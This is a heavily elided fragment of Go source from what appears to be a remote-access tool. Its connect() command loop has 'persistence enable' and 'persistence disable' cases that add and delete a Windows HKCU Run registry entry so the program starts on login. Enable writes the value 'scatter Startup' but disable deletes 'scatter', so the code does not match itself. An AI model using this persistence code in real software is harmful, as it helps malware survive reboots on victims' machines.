...
func connect() {
	...
	for {
		...
		case "persistence enable":
			...
			startupReg := "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"scatter Startup\" /t REG_SZ /F /D " + "\"" + "%systemdrive%" + folderPath + folderExt + "\\" + fileName + "\""
		...
		case "persistence disable":
			...
			startupReg := "REG DELETE HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"scatter\" /F"
